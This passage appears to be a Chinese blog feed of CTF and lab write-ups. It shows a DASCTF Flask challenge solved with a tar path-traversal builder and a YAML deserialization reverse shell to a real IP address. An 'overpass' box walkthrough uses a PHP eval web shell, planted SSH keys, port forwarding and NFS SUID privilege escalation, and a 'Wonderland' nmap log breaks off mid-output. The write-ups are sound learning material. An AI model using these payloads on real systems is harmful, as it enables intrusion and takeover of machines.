class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> no.lower() <span class="keyword">in</span> <span class="built_in">str</span>(s).lower():</span><br><span class="line">            flag = <span class="literal">False</span></span><br><span class="line">            <span class="built_in">print</span>(no)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extractFile</span>(<span class="params">filepath, <span class="built_in">type</span></span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;解压tar文件&#x27;&#x27;&#x27;</span></span><br><span class="line">    extractdir = filepath.split(<span class="string">&quot;.&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(extractdir):</span><br><span class="line">        os.makedirs(extractdir)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span> == <span class="string">&quot;tar&quot;</span>:</span><br><span class="line">        tf = tarfile.TarFile(filepath)</span><br><span class="line">        tf.extractall(extractdir)</span><br><span class="line">        <span class="keyword">return</span> tf.getnames()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    fn = <span class="string">&quot;uploads/&quot;</span> + md5().hexdigest()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(fn):</span><br><span class="line">        os.makedirs(fn)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/upload&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&quot;/&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        upFile = request.files[<span class="string">&quot;file&quot;</span>]</span><br><span class="line">        <span class="built_in">print</span>(upFile)</span><br><span class="line">        <span class="keyword">if</span> re.search(<span class="string">r&quot;\.\.|/&quot;</span>, upFile.filename, re.M | re.I) != <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;Hacker!&#x27;);window.location.href=&#x27;/upload&#x27;&lt;/script&gt;&quot;</span></span><br><span class="line"></span><br><span class="line">        savePath = <span class="string">f&quot;uploads/<span class="subst">&#123;upFile.filename&#125;</span>&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(savePath)</span><br><span class="line">        upFile.save(savePath)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> tarfile.is_tarfile(savePath):</span><br><span class="line">            zipDatas = extractFile(savePath, <span class="string">&quot;tar&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(zipDatas)</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&quot;result.html&quot;</span>,</span><br><span class="line">                                   path=savePath,</span><br><span class="line">                                   files=zipDatas)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">f&quot;&lt;script&gt;alert(&#x27;<span class="subst">&#123;upFile.filename&#125;</span> upload successfully&#x27;);history.back(-1);&lt;/script&gt;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/src&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">src</span>():</span><br><span class="line">    <span class="keyword">if</span> request.args:</span><br><span class="line">        username = request.args.get(<span class="string">&quot;username&quot;</span>)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">f&quot;config/<span class="subst">&#123;username&#125;</span>.yaml&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            Config = yaml.load(f.read())</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&quot;admin.html&quot;</span>,</span><br><span class="line">                                   username=<span class="string">&quot;admin&quot;</span>,</span><br><span class="line">                                   message=<span class="string">&quot;success&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">8000</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>审计完源码，核心思路如下，先用upload路由上传tar压缩包，然后解压文件到./config/{username}.yaml，然后再/src?username={username}的方式来进行yaml反序列化。</p><p>有一个细节<code>Config = yaml.load(f.read())</code> 这一段代码标志着这个PyYAML版本似乎在5.1以下，因为5.1以上一般写法是<code>Config = yaml.load(f.read())</code></p><p>发现黑名单没有过滤os.system。所以直接反弹shell</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">!!python/object/apply:os.system</span> [<span class="string">&quot;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/115.236.153.174/47295 0&gt;&amp;1\&quot;&quot;</span>]</span><br></pre></td></tr></table></figure><p>所以思路很简单，所以动手。这里要用到一个CVE-2007-4559来进行tar文件打包</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tarfile</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change_name</span>(<span class="params">tarinfo</span>):</span><br><span class="line">    tarinfo.name = <span class="string">&quot;../../config/&quot;</span> + tarinfo.name</span><br><span class="line">    <span class="keyword">return</span> tarinfo</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> tarfile.<span class="built_in">open</span>(<span class="string">&quot;shell.tar&quot;</span>, <span class="string">&quot;w:tar&quot;</span>) <span class="keyword">as</span> tar:</span><br><span class="line">    tar.add(<span class="string">&quot;shell.yaml&quot;</span>, <span class="built_in">filter</span>=change_name)</span><br></pre></td></tr></table></figure><p>然后上传文件，并且解压缩到了config/shell.yaml</p><p><img src="https://gitee.com/fpointzero/imgforit/raw/master/img/image-20230903020931642.png" alt="image-20230903020931642"></p><p>然后访问拿到了shell</p><p><img src="https://gitee.com/fpointzero/imgforit/raw/master/img/image-20230903021058039.png" alt="image-20230903021058039"></p><p>直接cat /fll*即可</p><p>DASCTF{38527367633473623946862083463114}</p>]]></content>
      
      
      <categories>
          
          <category> 比赛wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WEB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>overpass</title>
      <link href="/2023/07/19/overpass/"/>
      <url>/2023/07/19/overpass/</url>
      
        <content type="html"><![CDATA[<h1 id="overpass3hosting"><a href="#overpass3hosting" class="headerlink" title="overpass3hosting"></a>overpass3hosting</h1><p>首先进行nmap扫描端口</p><p><code>nmap -vv -sV --script vuln 10.10.242.97</code></p><p>扫描结果如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line">PORT   STATE SERVICE REASON  VERSION</span><br><span class="line">21/tcp open  ftp     syn-ack vsftpd 3.0.3</span><br><span class="line">22/tcp open  ssh     syn-ack OpenSSH 8.0 (protocol 2.0)</span><br><span class="line">| vulners: </span><br><span class="line">|   cpe:/a:openbsd:openssh:8.0: </span><br><span class="line">|     CVE-2020-157786.8https://vulners.com/cve/CVE-2020-15778</span><br><span class="line">|     C94132FD-1FA5-5342-B6EE-0DAF45EEFFE36.8https://vulners.com/githubexploit/C94132FD-1FA5-5342-B6EE-0DAF45EEFFE3*EXPLOIT*</span><br><span class="line">|     10213DBE-F683-58BB-B6D3-3531736262076.8https://vulners.com/githubexploit/10213DBE-F683-58BB-B6D3-353173626207*EXPLOIT*</span><br><span class="line">|     CVE-2021-416174.4https://vulners.com/cve/CVE-2021-41617</span><br><span class="line">|     CVE-2019-169054.4https://vulners.com/cve/CVE-2019-16905</span><br><span class="line">|     CVE-2020-141454.3https://vulners.com/cve/CVE-2020-14145</span><br><span class="line">|     CVE-2016-200124.3https://vulners.com/cve/CVE-2016-20012</span><br><span class="line">|_    CVE-2021-363682.6https://vulners.com/cve/CVE-2021-36368</span><br><span class="line">80/tcp open  http    syn-ack Apache httpd 2.4.37 ((centos))</span><br><span class="line">|_http-csrf: Couldn&#x27;t find any CSRF vulnerabilities.</span><br><span class="line">|_http-server-header: Apache/2.4.37 (centos)</span><br><span class="line">|_http-stored-xss: Couldn&#x27;t find any stored XSS vulnerabilities.</span><br><span class="line">|_http-jsonp-detection: Couldn&#x27;t find any JSONP endpoints.</span><br><span class="line">| http-enum: </span><br><span class="line">|   /backups/: Backup folder w/ directory listing</span><br><span class="line">|_  /icons/: Potentially interesting folder w/ directory listing</span><br><span class="line">|_http-litespeed-sourcecode-download: Request with null byte did not work. This web server might not be vulnerable</span><br><span class="line">|_http-wordpress-users: [Error] Wordpress installation was not found. We couldn&#x27;t find wp-login.php</span><br><span class="line">| http-trace: TRACE is enabled</span><br><span class="line">| Headers:</span><br><span class="line">| Date: Wed, 19 Jul 2023 08:02:28 GMT</span><br><span class="line">| Server: Apache/2.4.37 (centos)</span><br><span class="line">| Connection: close</span><br><span class="line">| Transfer-Encoding: chunked</span><br><span class="line">|_Content-Type: message/http</span><br><span class="line">| vulners: </span><br><span class="line">|   cpe:/a:apache:http_server:2.4.37: </span><br><span class="line">|     CVE-2019-95177.8https://vulners.com/cve/CVE-2019-9517</span><br><span class="line">|     PACKETSTORM:1716317.5https://vulners.com/packetstorm/PACKETSTORM:171631*EXPLOIT*</span><br><span class="line">|     EDB-ID:511937.5https://vulners.com/exploitdb/EDB-ID:51193*EXPLOIT*</span><br><span class="line">|     CVE-2023-256907.5https://vulners.com/cve/CVE-2023-25690</span><br><span class="line">|     CVE-2022-318137.5https://vulners.com/cve/CVE-2022-31813</span><br><span class="line">|     CVE-2022-239437.5https://vulners.com/cve/CVE-2022-23943</span><br><span class="line">|     CVE-2022-227207.5https://vulners.com/cve/CVE-2022-22720</span><br><span class="line">|     CVE-2021-447907.5https://vulners.com/cve/CVE-2021-44790</span><br><span class="line">|     CVE-2021-392757.5https://vulners.com/cve/CVE-2021-39275</span><br><span class="line">|     CVE-2021-266917.5https://vulners.com/cve/CVE-2021-26691</span><br><span class="line">|     CVE-2020-119847.5https://vulners.com/cve/CVE-2020-11984</span><br><span class="line">|     CNVD-2022-731237.5https://vulners.com/cnvd/CNVD-2022-73123</span><br><span class="line">|     CNVD-2022-032257.5https://vulners.com/cnvd/CNVD-2022-03225</span><br><span class="line">|     CNVD-2021-1023867.5https://vulners.com/cnvd/CNVD-2021-102386</span><br><span class="line">|     5C1BB960-90C1-5EBF-9BEF-F58BFFDFEED97.5https://vulners.com/githubexploit/5C1BB960-90C1-5EBF-9BEF-F58BFFDFEED9*EXPLOIT*</span><br><span class="line">|     1337DAY-ID-384277.5https://vulners.com/zdt/1337DAY-ID-38427*EXPLOIT*</span><br><span class="line">|     1337DAY-ID-348827.5https://vulners.com/zdt/1337DAY-ID-34882*EXPLOIT*</span><br><span class="line">|     EXPLOITPACK:44C5118F831D55FAF4259C41D8BDA0AB7.2https://vulners.com/exploitpack/EXPLOITPACK:44C5118F831D55FAF4259C41D8BDA0AB*EXPLOIT*</span><br><span class="line">|     EDB-ID:466767.2https://vulners.com/exploitdb/EDB-ID:46676*EXPLOIT*</span><br><span class="line">|     CVE-2019-02117.2https://vulners.com/cve/CVE-2019-0211</span><br><span class="line">|     1337DAY-ID-325027.2https://vulners.com/zdt/1337DAY-ID-32502*EXPLOIT*</span><br><span class="line">|     FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE86.8https://vulners.com/githubexploit/FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8*EXPLOIT*</span><br><span class="line">|     CVE-2021-404386.8https://vulners.com/cve/CVE-2021-40438</span><br><span class="line">|     CVE-2020-354526.8https://vulners.com/cve/CVE-2020-35452</span><br><span class="line">|     CNVD-2022-032246.8https://vulners.com/cnvd/CNVD-2022-03224</span><br><span class="line">|     8AFB43C5-ABD4-52AD-BB19-24D7884FF2A26.8https://vulners.com/githubexploit/8AFB43C5-ABD4-52AD-BB19-24D7884FF2A2*EXPLOIT*</span><br><span class="line">|     4810E2D9-AC5F-5B08-BFB3-DDAFA2F633326.8https://vulners.com/githubexploit/4810E2D9-AC5F-5B08-BFB3-DDAFA2F63332*EXPLOIT*</span><br><span class="line">|     4373C92A-2755-5538-9C91-0469C995AA9B6.8https://vulners.com/githubexploit/4373C92A-2755-5538-9C91-0469C995AA9B*EXPLOIT*</span><br><span class="line">|     0095E929-7573-5E4A-A7FA-F6598A35E8DE6.8https://vulners.com/githubexploit/0095E929-7573-5E4A-A7FA-F6598A35E8DE*EXPLOIT*</span><br><span class="line">|     CVE-2022-286156.4https://vulners.com/cve/CVE-2022-28615</span><br><span class="line">|     CVE-2021-442246.4https://vulners.com/cve/CVE-2021-44224</span><br><span class="line">|     CVE-2019-100826.4https://vulners.com/cve/CVE-2019-10082</span><br><span class="line">|     CVE-2019-100976.0https://vulners.com/cve/CVE-2019-10097</span><br><span class="line">|     CVE-2019-02176.0https://vulners.com/cve/CVE-2019-0217</span><br><span class="line">|     CVE-2019-02156.0https://vulners.com/cve/CVE-2019-0215</span><br><span class="line">|     CVE-2022-227215.8https://vulners.com/cve/CVE-2022-22721</span><br><span class="line">|     CVE-2020-19275.8https://vulners.com/cve/CVE-2020-1927</span><br><span class="line">|     CVE-2019-100985.8https://vulners.com/cve/CVE-2019-10098</span><br><span class="line">|     1337DAY-ID-335775.8https://vulners.com/zdt/1337DAY-ID-33577*EXPLOIT*</span><br><span class="line">|     CVE-2022-367605.1https://vulners.com/cve/CVE-2022-36760</span><br><span class="line">|     CVE-2023-275225.0https://vulners.com/cve/CVE-2023-27522</span><br><span class="line">|     CVE-2022-374365.0https://vulners.com/cve/CVE-2022-37436</span><br><span class="line">|     CVE-2022-305565.0https://vulners.com/cve/CVE-2022-30556</span><br><span class="line">|     CVE-2022-294045.0https://vulners.com/cve/CVE-2022-29404</span><br><span class="line">|     CVE-2022-286145.0https://vulners.com/cve/CVE-2022-28614</span><br><span class="line">|     CVE-2022-263775.0https://vulners.com/cve/CVE-2022-26377</span><br><span class="line">|     CVE-2022-227195.0https://vulners.com/cve/CVE-2022-22719</span><br><span class="line">|     CVE-2021-361605.0https://vulners.com/cve/CVE-2021-36160</span><br><span class="line">|     CVE-2021-347985.0https://vulners.com/cve/CVE-2021-34798</span><br><span class="line">|     CVE-2021-331935.0https://vulners.com/cve/CVE-2021-33193</span><br><span class="line">|     CVE-2021-266905.0https://vulners.com/cve/CVE-2021-26690</span><br><span class="line">|     CVE-2020-94905.0https://vulners.com/cve/CVE-2020-9490</span><br><span class="line">|     CVE-2020-19345.0https://vulners.com/cve/CVE-2020-1934</span><br><span class="line">|     CVE-2019-175675.0https://vulners.com/cve/CVE-2019-17567</span><br><span class="line">|     CVE-2019-100815.0https://vulners.com/cve/CVE-2019-10081</span><br><span class="line">|     CVE-2019-02205.0https://vulners.com/cve/CVE-2019-0220</span><br><span class="line">|     CVE-2019-01965.0https://vulners.com/cve/CVE-2019-0196</span><br><span class="line">|     CVE-2018-171995.0https://vulners.com/cve/CVE-2018-17199</span><br><span class="line">|     CVE-2018-171895.0https://vulners.com/cve/CVE-2018-17189</span><br><span class="line">|     CVE-2006-200015.0https://vulners.com/cve/CVE-2006-20001</span><br><span class="line">|     CNVD-2022-731225.0https://vulners.com/cnvd/CNVD-2022-73122</span><br><span class="line">|     CNVD-2022-535845.0https://vulners.com/cnvd/CNVD-2022-53584</span><br><span class="line">|     CNVD-2022-535825.0https://vulners.com/cnvd/CNVD-2022-53582</span><br><span class="line">|     CNVD-2022-032235.0https://vulners.com/cnvd/CNVD-2022-03223</span><br><span class="line">|     CVE-2019-01974.9https://vulners.com/cve/CVE-2019-0197</span><br><span class="line">|     CVE-2020-119934.3https://vulners.com/cve/CVE-2020-11993</span><br><span class="line">|     CVE-2019-100924.3https://vulners.com/cve/CVE-2019-10092</span><br><span class="line">|     4013EC74-B3C1-5D95-938A-54197A58586D4.3https://vulners.com/githubexploit/4013EC74-B3C1-5D95-938A-54197A58586D*EXPLOIT*</span><br><span class="line">|     1337DAY-ID-354224.3https://vulners.com/zdt/1337DAY-ID-35422*EXPLOIT*</span><br><span class="line">|     1337DAY-ID-335754.3https://vulners.com/zdt/1337DAY-ID-33575*EXPLOIT*</span><br><span class="line">|_    PACKETSTORM:1524410.0https://vulners.com/packetstorm/PACKETSTORM:152441*EXPLOIT*</span><br><span class="line">|_http-dombased-xss: Couldn&#x27;t find any DOM based XSS.</span><br><span class="line">Service Info: OS: Unix</span><br></pre></td></tr></table></figure><p>存在21,22,80三个端口，首先21是ftp，22是ssh，80就是http了</p><p>然后nmap还帮我们扫描出服务端的一些目录，/backups/</p><p>然后访问发现里面有backup.zip文件</p><p><img src="https://gitee.com/fpointzero/imgforit/raw/master/img/image-20230719160839114.png" alt="image-20230719160839114"></p><p>解压以后里面有</p><p><img src="https://gitee.com/fpointzero/imgforit/raw/master/img/image-20230719161034273.png" alt="image-20230719161034273"></p><p>gpg加密加上对应的私钥，所以可以利用privkey解密</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gpg --import priv.key</span><br><span class="line">gpg -d -o CustomerDetails.xlsx --decrypt CustomerDetails.xlsx.gpg</span><br></pre></td></tr></table></figure><p>打开里面发现有</p><p><img src="https://gitee.com/fpointzero/imgforit/raw/master/img/image-20230719161907991.png" alt="image-20230719161907991"></p><p>尝试用用户名和密码登录ssh发现paradox是禁止密码登录ssh的，其他的完全登不了</p><p>于是尝试利用ftp，首先尝试ftp匿名登录失败了，然后继续用账号密码测试，然后发现paradox可以登录</p><p><img src="https://gitee.com/fpointzero/imgforit/raw/master/img/image-20230719162337966.png" alt="image-20230719162337966"></p><p>然后查看文件，发现目录在80的web服务目录下面</p><p><img src="https://gitee.com/fpointzero/imgforit/raw/master/img/image-20230719162703465.png" alt="image-20230719162703465"></p><p>尝试上传一个php后门，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># shell.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="string">&quot;test&quot;</span>;<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;cmd&quot;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后访问页面发现执行了php脚本，于是利用后面反弹交互式shell</p><p><img src="https://gitee.com/fpointzero/imgforit/raw/master/img/image-20230719163759343.png" alt="image-20230719163759343"></p><p>回想起来我们拥有paradox用户的密码，所以可以直接用paradox用户的密码登录，</p><p><img src="https://gitee.com/fpointzero/imgforit/raw/master/img/image-20230719164050052.png" alt="image-20230719164050052"></p><p><img src="https://gitee.com/fpointzero/imgforit/raw/master/img/image-20230719164025933.png" alt="image-20230719164025933"></p><p>然后创建sshkey以方便我们登录</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen</span><br></pre></td></tr></table></figure><p>我这里是将ssh-key指定了文件，然后把对应的公钥放入authorized_keys文件里面即可，然后将私钥拷贝下来。</p><p><img src="https://gitee.com/fpointzero/imgforit/raw/master/img/image-20230719164535186.png" alt="image-20230719164535186"></p><p>然后利用设置私钥权限为0700然后进行链接</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i sshkey paradox@10.10.242.97</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/fpointzero/imgforit/raw/master/img/image-20230719165146098.png" alt="image-20230719165146098"></p><p>然后上传linpeas.sh进行提权</p><p><a href="https://github.com/carlospolop/PEASS-ng/tree/master">carlospolop/PEASS-ng: PEASS - Privilege Escalation Awesome Scripts SUITE (with colors) (github.com)</a></p><p><img src="https://gitee.com/fpointzero/imgforit/raw/master/img/image-20230719165445430.png" alt="image-20230719165445430"></p><p>然后发现存在NFS且开启的模式是no_root_squash且权限是rw所以可以直接利用这个进行提权，并且可挂载目录在james的用户目录</p><p><img src="https://gitee.com/fpointzero/imgforit/raw/master/img/image-20230719170204618.png" alt="image-20230719170204618"></p><p><a href="https://cloud.tencent.com/developer/article/1708369">Linux提权姿势二：利用NFS提权-腾讯云开发者社区-腾讯云 (tencent.com)</a></p><p>NFS端口是2049，但是我们nmap扫描的时候并没有识别到这个端口，说明可能端口被防火墙之类的关闭了，所以我们需要利用端口转发之类的，将服务器上面的2049端口可以转发到本地的2049端口然后在进行操作。</p><p>这里可以利用chisel工具或者直接利用ssh就可以进行端口转发</p><p>ssh进行端口转发：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i ~/Desktop/sshkey -L 2049:localhost:2049 paradox@10.10.242.97 -p 22 </span><br></pre></td></tr></table></figure><p>然后kali在/mnt目录下面创一个目录用于挂载靶机对应目录</p><p><img src="https://gitee.com/fpointzero/imgforit/raw/master/img/image-20230719171831961.png" alt="image-20230719171831961"></p><p>发现成功挂载了</p><p><img src="https://gitee.com/fpointzero/imgforit/raw/master/img/image-20230719171936533.png" alt="image-20230719171936533"></p><p>因为no_root_squash造成不安全，在这里我们可以以root身份上传文件，并且可以被靶机识别成root的文件，所以假设我们上传一个suid文件那么对应的文件在靶机看来就是root创建的具有suid的文件。</p><p>并且这里我们也可以获取到james的sshkey的私钥</p><p><img src="https://gitee.com/fpointzero/imgforit/raw/master/img/image-20230719172710757.png" alt="image-20230719172710757"></p><p>具体可以利用root权限上传一个带suid权限的sh或者bash文件，然后用james用户去执行达到提权。</p><p><img src="https://gitee.com/fpointzero/imgforit/raw/master/img/image-20230719173054953.png" alt="image-20230719173054953"></p><p><img src="https://gitee.com/fpointzero/imgforit/raw/master/img/image-20230719173123467.png" alt="image-20230719173123467"></p><p>文件就是标准的suid文件</p><p><img src="https://gitee.com/fpointzero/imgforit/raw/master/img/image-20230719173154558.png" alt="image-20230719173154558"></p><p>然后执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./sh2 -p</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/fpointzero/imgforit/raw/master/img/image-20230719173235062.png" alt="image-20230719173235062"></p>]]></content>
      
      
      <categories>
          
          <category> 知识学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Wonderland</title>
      <link href="/2023/07/14/Wonderland/"/>
      <url>/2023/07/14/Wonderland/</url>
      
        <content type="html"><![CDATA[<h1 id="Wonderland"><a href="#Wonderland" class="headerlink" title="Wonderland"></a>Wonderland</h1><p>这个首先给了个IP，首先进行nmap扫描</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/WEBTOOL]</span><br><span class="line">└─$ sudo nmap -sV -vv --script vuln 10.10.255.228                                                                            </span><br><span class="line">[sudo] kali 的密码：</span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2023-07-14 03:36 EDT</span><br><span class="line">NSE: Loaded 149 scripts for scanning.</span><br><span class="line">NSE: Script Pre-scanning.</span><br><span class="line">NSE: Starting runlevel 1 (of 2) scan.</span><br><span class="line">Initiating NSE at 03:36</span><br><span class="line">Completed NSE at 03:37, 10.00s elapsed</span><br><span class="line">NSE: Starting runlevel 2 (of 2) scan.</span><br><span class="line">Initiating NSE at 03:37</span><br><span class="line">Completed NSE at 03:37, 0.00s 